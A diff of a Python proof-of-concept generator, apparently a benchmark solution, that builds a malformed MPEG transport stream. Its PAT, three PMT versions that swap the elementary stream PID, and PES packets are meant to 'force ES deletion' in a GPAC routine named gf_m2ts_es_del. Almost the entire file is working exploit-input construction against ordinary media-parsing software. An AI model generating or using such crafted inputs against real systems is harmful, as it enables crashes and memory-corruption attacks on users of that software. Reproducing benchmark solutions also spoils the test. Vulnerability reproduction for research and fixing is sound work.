@@ -1,147 +1,165 @@
+import os
 import tarfile
-from typing import Optional
+from typing import List, Tuple
 
-
-def _crc32_mpeg2(data: bytes) -> int:
-    crc = 0xFFFFFFFF
+def _mpeg2_crc32_table():
     poly = 0x04C11DB7
-    for b in data:
-        crc ^= (b << 24) & 0xFFFFFFFF
+    table = []
+    for i in range(256):
+        c = i << 24
         for _ in range(8):
-            if crc & 0x80000000:
-                crc = ((crc << 1) & 0xFFFFFFFF) ^ poly
+            if c & 0x80000000:
+                c = ((c << 1) & 0xFFFFFFFF) ^ poly
             else:
-                crc = (crc << 1) & 0xFFFFFFFF
+                c = (c << 1) & 0xFFFFFFFF
+        table.append(c)
+    return table
+
+_CRC_TABLE = _mpeg2_crc32_table()
+
+def mpeg2_crc32(data: bytes) -> int:
+    crc = 0xFFFFFFFF
+    for b in data:
+        crc = ((crc << 8) & 0xFFFFFFFF) ^ _CRC_TABLE[((crc >> 24) ^ b) & 0xFF]
     return crc & 0xFFFFFFFF
 
+def _psi_section_header(table_id: int, section_length: int) -> bytes:
+    b1 = 0xB0 | ((section_length >> 8) & 0x0F)
+    b2 = section_length & 0xFF
+    return bytes([table_id, b1, b2])
 
-def _u16be(x: int) -> bytes:
-    return bytes([(x >> 8) & 0xFF, x & 0xFF])
+def _pid_bytes(pid: int) -> bytes:
+    return bytes([0xE0 | ((pid >> 8) & 0x1F), pid & 0xFF])
 
-
-def _u32be(x: int) -> bytes:
-    return bytes([(x >> 24) & 0xFF, (x >> 16) & 0xFF, (x >> 8) & 0xFF, x & 0xFF])
-
-
-def _ts_packet(pid: int, pusi: int, cc: int, payload: bytes) -> bytes:
-    if len(payload) != 184:
-        if len(payload) > 184:
-            payload = payload[:184]
-        else:
-            payload = payload + (b"\xFF" * (184 - len(payload)))
-    b0 = 0x47
-    b1 = ((pusi & 1) << 6) | ((pid >> 8) & 0x1F)
-    b2 = pid & 0xFF
-    b3 = 0x10 | (cc & 0x0F)  # payload only
-    return bytes([b0, b1, b2, b3]) + payload
-
-
-def _pat_section(pmt_pid: int, tsid: int = 1, version: int = 0, program_number: int = 1) -> bytes:
-    section_length = 13
+def build_pat_section(ts_id: int, program_number: int, pmt_pid: int, version: int = 0) -> bytes:
+    programs = bytes([
+        (program_number >> 8) & 0xFF, program_number & 0xFF,
+        0xE0 | ((pmt_pid >> 8) & 0x1F), pmt_pid & 0xFF
+    ])
+    section_length = 5 + len(programs) + 4
     sec = bytearray()
-    sec.append(0x00)  # table_id
-    sec.append(0xB0 | ((section_length >> 8) & 0x0F))
-    sec.append(section_length & 0xFF)
-    sec += _u16be(tsid)
-    sec.append(0xC0 | ((version & 0x1F) << 1) | 0x01)  # reserved, version, current_next
-    sec.append(0x00)  # section_number
-    sec.append(0x00)  # last_section_number
-    sec += _u16be(program_number)
-    sec.append(0xE0 | ((pmt_pid >> 8) & 0x1F))
-    sec.append(pmt_pid & 0xFF)
-    crc = _crc32_mpeg2(bytes(sec))
-    sec += _u32be(crc)
+    sec += _psi_section_header(0x00, section_length)
+    sec += bytes([(ts_id >> 8) & 0xFF, ts_id & 0xFF])
+    sec += bytes([0xC0 | ((version & 0x1F) << 1) | 0x01])
+    sec += b"\x00\x00"
+    sec += programs
+    crc = mpeg2_crc32(sec)
+    sec += crc.to_bytes(4, "big")
     return bytes(sec)
 
-
-def _pmt_section(
-    program_number: int,
-    version: int,
-    pcr_pid: int,
-    es_pid: int,
-    stream_type: int = 0x1B,
-) -> bytes:
-    program_info_length = 0
-    es_info_length = 0
-    section_length = 18  # fixed for one ES, no descriptors
+def build_pmt_section(program_number: int, pcr_pid: int, streams: List[Tuple[int, int]], version: int = 0, pmt_pid: int = 0x1000) -> bytes:
+    es_loop = bytearray()
+    for stream_type, elem_pid in streams:
+        es_loop += bytes([stream_type & 0xFF])
+        es_loop += _pid_bytes(elem_pid)
+        es_loop += b"\xF0\x00"
+    section_length = 9 + len(es_loop) + 4
     sec = bytearray()
-    sec.append(0x02)  # table_id
-    sec.append(0xB0 | ((section_length >> 8) & 0x0F))
-    sec.append(section_length & 0xFF)
-    sec += _u16be(program_number)
-    sec.append(0xC0 | ((version & 0x1F) << 1) | 0x01)
-    sec.append(0x00)  # section_number
-    sec.append(0x00)  # last_section_number
-    sec.append(0xE0 | ((pcr_pid >> 8) & 0x1F))
-    sec.append(pcr_pid & 0xFF)
-    sec.append(0xF0 | ((program_info_length >> 8) & 0x0F))
-    sec.append(program_info_length & 0xFF)
-    sec.append(stream_type & 0xFF)
-    sec.append(0xE0 | ((es_pid >> 8) & 0x1F))
-    sec.append(es_pid & 0xFF)
-    sec.append(0xF0 | ((es_info_length >> 8) & 0x0F))
-    sec.append(es_info_length & 0xFF)
-    crc = _crc32_mpeg2(bytes(sec))
-    sec += _u32be(crc)
+    sec += _psi_section_header(0x02, section_length)
+    sec += bytes([(program_number >> 8) & 0xFF, program_number & 0xFF])
+    sec += bytes([0xC0 | ((version & 0x1F) << 1) | 0x01])
+    sec += b"\x00\x00"
+    sec += _pid_bytes(pcr_pid)
+    sec += b"\xF0\x00"
+    sec += es_loop
+    crc = mpeg2_crc32(sec)
+    sec += crc.to_bytes(4, "big")
     return bytes(sec)
 
+def build_ts_packet(pid: int, payload: bytes, pusi: bool, cc: int, payload_only: bool = True) -> bytes:
+    if payload_only:
+        afc = 1
+        header = bytearray(4)
+        header[0] = 0x47
+        header[1] = ((1 if pusi else 0) << 6) | ((pid >> 8) & 0x1F)
+        header[2] = pid & 0xFF
+        header[3] = (afc << 4) | (cc & 0x0F)
+        max_payload = 184
+        if len(payload) > max_payload:
+            payload = payload[:max_payload]
+        pad_len = max_payload - len(payload)
+        return bytes(header) + payload + (b"\xFF" * pad_len)
+    else:
+        afc = 3
+        header = bytearray(4)
+        header[0] = 0x47
+        header[1] = ((1 if pusi else 0) << 6) | ((pid >> 8) & 0x1F)
+        header[2] = pid & 0xFF
+        header[3] = (afc << 4) | (cc & 0x0F)
+        max_payload = 183
+        if len(payload) > max_payload:
+            payload = payload[:max_payload]
+        # Put a minimal adaptation field (length=0) then payload
+        pad_len = max_payload - len(payload)
+        return bytes(header) + b"\x00" + payload + (b"\xFF" * pad_len)
 
-def _psi_payload(section: bytes) -> bytes:
-    return b"\x00" + section  # pointer_field=0
+def build_null_packet(cc: int = 0) -> bytes:
+    pid = 0x1FFF
+    header = bytearray(4)
+    header[0] = 0x47
+    header[1] = ((pid >> 8) & 0x1F)
+    header[2] = pid & 0xFF
+    header[3] = (1 << 4) | (cc & 0x0F)
+    return bytes(header) + (b"\xFF" * 184)
 
-
-def _pes_start_payload(stream_id: int = 0xE0, fill: int = 0x55) -> bytes:
+def build_pes_payload(stream_id: int = 0xE0, payload_data_len: int = 160) -> bytes:
+    # Minimal PES header with no PTS/DTS.
     pes = bytearray()
     pes += b"\x00\x00\x01"
-    pes.append(stream_id & 0xFF)
-    pes += b"\x00\x00"  # PES_packet_length=0 (unbounded)
-    pes += b"\x80\x00\x00"  # MPEG2 PES: '10', no flags, header_data_length=0
-    if len(pes) < 184:
-        pes += bytes([fill]) * (184 - len(pes))
-    return bytes(pes[:184])
-
-
-def _pes_cont_payload(fill: int = 0x56) -> bytes:
-    # Avoid 00 00 01 at the start to reduce chance of resync heuristics
-    return bytes([fill]) * 184
-
-
-def _detect_has_symbol(src_path: str, sym: str) -> bool:
-    try:
-        with tarfile.open(src_path, "r:*") as tf:
-            for m in tf.getmembers():
-                if not m.isfile():
-                    continue
-                name = m.name.lower()
-                if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h") or name.endswith(".hh")):
-                    continue
-                f = tf.extractfile(m)
-                if not f:
-                    continue
-                data = f.read()
-                if sym.encode("utf-8") in data:
-                    return True
-    except Exception:
-        return False
-    return False
-
+    pes += bytes([stream_id & 0xFF])
+    pes += b"\x00\x00"
+    pes += b"\x80\x00\x00"
+    if payload_data_len < 0:
+        payload_data_len = 0
+    pes += b"\x00" * payload_data_len
+    return bytes(pes)
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        _ = _detect_has_symbol(src_path, "gf_m2ts_es_del")
+        # Optional: try to locate the relevant source function (not required for generation).
+        try:
+            if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
+                with tarfile.open(src_path, "r:*") as tf:
+                    for m in tf.getmembers():
+                        if not m.isfile():
+                            continue
+                        n = m.name
+                        if not (n.endswith(".c") or n.endswith(".h") or n.endswith(".cc") or n.endswith(".cpp")):
+                            continue
+                        f = tf.extractfile(m)
+                        if not f:
+                            continue
+                        data = f.read()
+                        if b"gf_m2ts_es_del" in data:
+                            break
+        except Exception:
+            pass
 
-        pmt_pid = 0x0100
-        old_es_pid = 0x0101
-        new_es_pid = 0x0102
+        ts_id = 1
+        program_number = 1
+        pmt_pid = 0x1000
 
-        pat = _ts_packet(0x0000, 1, 0, _psi_payload(_pat_section(pmt_pid)))
-        pmt_v0 = _ts_packet(pmt_pid, 1, 0, _psi_payload(_pmt_section(1, 0, old_es_pid, old_es_pid, 0x1B)))
+        pat = build_pat_section(ts_id=ts_id, program_number=program_number, pmt_pid=pmt_pid, version=0)
 
-        pes_start = _ts_packet(old_es_pid, 1, 0, _pes_start_payload(0xE0, 0x55))
+        # Stream types chosen as common PES (H.264/AVC) with changing PID to force ES deletion.
+        pid_a = 0x0100
+        pid_b = 0x0101
 
-        pmt_v1 = _ts_packet(pmt_pid, 1, 1, _psi_payload(_pmt_section(1, 1, new_es_pid, new_es_pid, 0x1B)))
+        pmt_v0 = build_pmt_section(program_number=program_number, pcr_pid=pid_a, streams=[(0x1B, pid_a)], version=0, pmt_pid=pmt_pid)
+        pmt_v1 = build_pmt_section(program_number=program_number, pcr_pid=pid_b, streams=[(0x1B, pid_b)], version=1, pmt_pid=pmt_pid)
+        pmt_v2 = build_pmt_section(program_number=program_number, pcr_pid=pid_a, streams=[(0x1B, pid_a)], version=2, pmt_pid=pmt_pid)
 
-        pes_cont1 = _ts_packet(old_es_pid, 0, 1, _pes_cont_payload(0x56))
-        pes_cont2 = _ts_packet(old_es_pid, 0, 2, _pes_cont_payload(0x57))
+        pkt1 = build_ts_packet(0x0000, b"\x00" + pat, pusi=True, cc=0)
+        pkt2 = build_ts_packet(pmt_pid, b"\x00" + pmt_v0, pusi=True, cc=0)
 
-        return pat + pmt_v0 + pes_start + pmt_v1 + pes_cont1 + pes_cont2
+        pes_a = build_pes_payload(stream_id=0xE0, payload_data_len=160)
+        pkt3 = build_ts_packet(pid_a, pes_a, pusi=True, cc=0)
+
+        pkt4 = build_ts_packet(pmt_pid, b"\x00" + pmt_v1, pusi=True, cc=1)
+
+        pes_b = build_pes_payload(stream_id=0xE0, payload_data_len=160)
+        pkt5 = build_ts_packet(pid_b, pes_b, pusi=True, cc=0)
+
+        pkt6 = build_ts_packet(pmt_pid, b"\x00" + pmt_v2, pusi=True, cc=2)
+
+        return pkt1 + pkt2 + pkt3 + pkt4 + pkt5 + pkt6
